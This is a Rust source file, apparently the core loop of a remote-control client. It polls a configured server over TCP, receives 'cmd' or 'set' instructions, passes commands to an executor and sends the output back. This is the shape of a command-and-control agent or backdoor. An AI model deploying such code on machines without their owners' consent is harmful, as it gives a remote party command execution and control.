pub mod config;

mod instruction;
mod instruction_output;
mod received_setting;
mod received_command;

use received_command::ReceivedCommand;
use received_setting::ReceivedSetting;

use std::net::TcpStream;
use std::{io, thread, time};

pub fn run(config: &mut config::Config) {
    loop {
        thread::sleep(config.request_period.to_duration());

        let full_address = config.server.full_address();

        println!("Connecting to server at {}", &full_address);
        let stream =
            TcpStream::connect_timeout(&full_address, time::Duration::from_millis(config.timeout));

        match stream {
            Ok(stream) => {
                println!("Connected to server at {}", full_address);
                let _ = handle_stream(stream, config);
            }
            Err(_) => {
                println!("Failed to connect to server at {}", full_address);
                continue;
            }
        }
    }
}

fn handle_stream(mut stream: TcpStream, config: &mut config::Config) -> Result<(), io::Error> {
    let instruction = parse_stream(&stream);

    match instruction.execute(config) {
        Ok(output) => {
            output.send_feedback(&mut stream)?;
        }
        Err(_err) => {
            //Error while executing instruction
        }
    }
    Ok(())
}

fn parse_stream(stream: &TcpStream) -> instruction::Executable {
    let mut buffer = [0; 1024];
    stream
        .peek(&mut buffer)
        .expect("Failed to read from stream");

    let input = String::from_utf8_lossy(&buffer[..]);
    let input = input.trim_matches(char::from(0));
    println!("Received instruction: {}", input);

    instruction_factory(input)
}

fn instruction_factory(instruction: &str) -> instruction::Executable {
    let parts: Vec<&str> = instruction.split_whitespace().collect();
    match parts[0] {
        "cmd" => instruction::Executable::Command(ReceivedCommand::from_string(parts[1..].join(" "))),
        "set" => instruction::Executable::Setting(ReceivedSetting::from_string(
            parts[1].to_string(),
            parts[2..].join(" ").to_string(),
        )),
        _ => instruction::Executable::Command(ReceivedCommand::from_string("".to_string())),
    }
}

